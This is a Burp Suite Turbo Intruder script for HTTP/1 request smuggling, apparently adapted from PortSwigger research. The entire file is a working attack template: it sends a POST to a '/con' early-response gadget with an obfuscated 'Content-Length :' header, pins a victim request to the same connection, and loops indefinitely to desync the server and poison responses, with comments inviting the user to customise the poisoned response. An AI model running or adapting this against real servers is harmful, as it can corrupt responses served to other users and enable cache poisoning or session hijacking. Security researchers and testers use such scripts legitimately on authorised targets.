# Refer to https://portswigger.net/research/http1-must-die
def queueRequests(target, wordlists):
    # Engine.BURP forces requestsPerConnection=1 (no keep-alive) — every separate
    # engine.queue() call gets its OWN fresh connection unless pinned with connectionId.
    # The victim request needs to share a connection with the smuggle request to actually
    # measure desync — a connectionId is generated per loop iteration below for both.
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           engine=Engine.BURP,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           timeout=15
                           )

    host = target.endpoint.replace('https://', '').replace('http://', '').split(':')[0].split('/')[0]

    # The request should contain an early-response gadget and a (maybe obfuscated) Content-Length header with the value set to %s
    smuggle_req = '''POST /con HTTP/1.1
Host: '''+host+'''
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length : %s

'''

    # Customise this to get a poisoned response of your choice
    smuggledLine = 'GET /404 HTTP/1.1'

    # Add extra headers if required
    victim = '''GET / HTTP/1.1
Host: '''+host+'''

'''

    # No need to edit below this line
    if '%s' not in smuggle_req:
        raise Exception('Please place %s in the Content-Length header value')

    if not smuggle_req.endswith('\r\n\r\n'):
        raise Exception('Smuggle request must end with a blank line and have no body')

    victim = victim.replace('\r\n', '\r\nA: A'+smuggledLine+'\r\n', 1)

    i = 0
    while True:
        i += 1
        # Same connectionId on both calls pins smuggle+victim to one TCP connection — without
        # this, requestsPerConnection=1 still means each queue() call gets its own fresh
        # connection, and 'victim' never actually sees the effect of 'smuggle'.
        connectionId = str(i)
        engine.queue(smuggle_req, victim.index(smuggledLine), label='smuggle', fixContentLength=False, connectionId=connectionId)
        engine.queue(victim, label='victim', connectionId=connectionId)


def handleResponse(req, interesting):
    table.add(req)

    # Uncomment & customise this if you want the run to automatically stop on success
    #if req.label == 'victim' and req.status == 404:
    #    req.engine.cancel()

